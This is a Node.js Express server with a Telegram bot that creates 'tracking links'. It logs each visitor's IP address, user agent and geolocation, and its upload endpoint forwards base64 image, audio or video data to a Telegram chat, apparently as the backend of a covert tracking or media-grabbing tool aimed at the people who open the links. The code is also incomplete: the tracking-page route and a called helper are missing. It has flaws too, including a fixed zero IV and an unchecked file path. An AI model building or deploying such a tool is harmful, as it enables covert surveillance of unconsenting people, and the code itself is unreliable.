const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const bodyParser = require('body-parser');
const geoip = require('geoip-lite');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const fs = require('fs');
const app = express();

// Initialize Telegram Bot with webhook
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });
bot.setWebHook(`${process.env.HOST_URL}/telegram-webhook`, {
  allowed_updates: ['message', 'edited_message', 'channel_post', 'edited_channel_post']
});

// Configuration
const CONFIG = {
  hostURL: process.env.HOST_URL,
  maxFileSize: 20 * 1024 * 1024, // 20MB
  allowedMedia: ['image', 'audio', 'video', 'document'],
  encryptionKey: process.env.ENCRYPTION_KEY,
  rateLimit: {
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100 // Limit each IP to 100 requests per windowMs
  }
};

// Middleware
app.use(helmet());
app.use(cors({ origin: process.env.CORS_ORIGIN || '*' }));
app.use(bodyParser.json({ limit: CONFIG.maxFileSize }));
app.use(bodyParser.urlencoded({ extended: true, limit: CONFIG.maxFileSize }));
app.set('trust proxy', true); // Trust reverse proxy (required for rate limiting)

// Rate limiting
const limiter = rateLimit({
  ...CONFIG.rateLimit,
  validate: { trustProxy: true }
});
app.use(limiter);

// Database simulation
const userDB = new Map();

// Encryption functions
const encrypt = (text) => {
  const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(CONFIG.encryptionKey), Buffer.alloc(16, 0));
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return encrypted;
};

const decrypt = (text) => {
  const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(CONFIG.encryptionKey), Buffer.alloc(16, 0));
  let decrypted = decipher.update(text, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
};

// Middleware to capture client info
app.use((req, res, next) => {
  req.clientInfo = {
    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
    userAgent: req.headers['user-agent'],
    geo: geoip.lookup(req.ip)
  };
  next();
});

// Webhook handler
app.post('/telegram-webhook', (req, res) => {
  try {
    const update = req.body;

    // Validate the update object
    if (!update || typeof update !== 'object') {
      throw new Error('Invalid update object');
    }

    // Log the update for debugging
    console.log('Received update:', JSON.stringify(update, null, 2));

    // Process the update
    bot.processUpdate(update);

    // Respond to Telegram
    res.sendStatus(200);
  } catch (error) {
    console.error('Webhook Error:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Handle regular messages
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (text === '/start') {
    await sendMessageWithDelay(chatId, 'Welcome! Use /create to generate a tracking link.');
  } else if (text === '/create') {
    const uid = crypto.randomBytes(16).toString('hex');
    const encryptedUID = encrypt(uid);
    const trackingUrl = `${CONFIG.hostURL}/w/${uid}/${encryptedUID}`;
    await sendMessageWithDelay(chatId, `🛠 Tracking link created:\n${trackingUrl}`);
  }
});

// Handle edited messages
bot.on('edited_message', async (msg) => {
  const chatId = msg.chat.id;
  await sendMessageWithDelay(chatId, `You edited your message to: ${msg.text}`);
});

// Handle channel posts
bot.on('channel_post', async (post) => {
  const chatId = post.chat.id;
  await sendMessageWithDelay(chatId, `New channel post: ${post.text}`);
});

// Handle edited channel posts
bot.on('edited_channel_post', async (post) => {
  const chatId = post.chat.id;
  await sendMessageWithDelay(chatId, `Edited channel post: ${post.text}`);
});

// File upload handler
app.post('/upload', async (req, res) => {
  try {
    const { uid, type, data } = req.body;

    if (!CONFIG.allowedMedia.includes(type)) {
      throw new Error('Invalid media type');
    }

    const buffer = Buffer.from(data, 'base64');
    const filePath = `/tmp/${uid}-${Date.now()}.${type}`;

    await fs.promises.writeFile(filePath, buffer);
    await bot.sendDocument(uid, filePath);

    res.status(200).send('OK');
  } catch (error) {
    console.error('Upload Error:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Root endpoint
app.get('/', (req, res) => {
  res.status(200).json({
    status: 'online',
    version: process.env.VERCEL_GIT_COMMIT_SHA || 'local',
    environment: process.env.NODE_ENV || 'development'
  });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Error:', err);
  bot.sendMessage(process.env.ADMIN_CHAT_ID, `⚠️ Error: ${err.message}`);
  res.status(500).send('Internal Server Error');
});

// Start server
const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
  bot.sendMessage(process.env.ADMIN_CHAT_ID, '🚀 Server started successfully');
});
